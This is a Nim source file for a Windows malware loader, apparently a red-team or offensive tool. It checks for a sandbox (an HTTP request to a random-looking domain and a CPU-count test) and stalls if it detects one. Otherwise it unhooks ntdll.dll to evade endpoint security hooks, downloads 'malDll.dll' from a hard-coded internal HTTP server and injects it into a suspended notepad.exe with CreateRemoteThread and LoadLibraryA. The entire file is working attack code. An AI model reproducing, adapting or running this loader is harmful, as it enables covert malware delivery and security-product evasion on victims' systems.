import httpclient
import winim
import os
import cpuinfo
import osproc
import dynlib
import strformat
import strutils
import ptr_math

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc vmCheck(): int =
  var count: int
  let clientHttp = newHttpClient()
  let responseHttp = clientHttp.get("http://0hRIb4t1fWNPYBVA.net/index.php")

  if responseHttp.code == cast[HttpCode]("200") or responseHttp.status == "200":
    count += 1

  if cpuinfo.countProcessors() <= 2:
    count += 1
  
  return count

proc vmTimeOut(): void =
  for i in 1 .. 100000:
    sleep(100)


proc ntdllunhook(): bool =
  let ntd: string = "ntdll.dll"
  let ntdllPath: string = r"C:\Windows\System32\ntdll.dll"
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA(ntd)
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(ntdllPath,fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true

proc injectThread(name: string): void =
    let targetProcess: string = "notepad.exe"
    let k32Str: string = "kernel32.dll"
    let loadlibAStr: string = "LoadLibraryA"
    echo "[*] Injecting: ", name

    let tProcess = startProcess(targetProcess)
    tProcess.suspend()
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](name.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle,
        rPtr,
        name.cstring,
        cast[SIZE_T](name.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)

    echo "[*] Bytes Written: ", bytesWritten
    echo ""

    #Get address method 1
    #let loadLibraryAddress = cast[LPVOID](GetProcAddress(GetModuleHandle(r"kernel32.dll"), r"LoadLibraryA"))

    #Get address method 2
    let k32 = loadLib(k32Str)
    let llAddress = k32.symAddr(loadlibAStr)

    let tHandle = CreateRemoteThread(
        pHandle,
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](llAddress),
        rPtr,
        0,
        NULL)

    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[*] Injected"

when defined(windows):
    when isMainModule:
        if vmCheck() >= 2:
          vmTimeout()
        else: 
          var unhookResult = ntdllunhook()
          echo fmt"[*] Unhooked Ntdll: {bool(unhookResult)}"

          let srvUrl: string = r"http://192.168.0.118:8000/malDll.dll"
          let client = newHttpClient()
          let download = client.getContent(srvUrl)

          try:
              let file = open("malDll.dll", fmWrite)
              defer: file.close()

              file.write(download)
              echo "[+] Download Sucessful!"
          except:
              echo "[-] Download Failed!"
          injectThread("malDll.dll")
          var pauseEx = readLine(stdin)
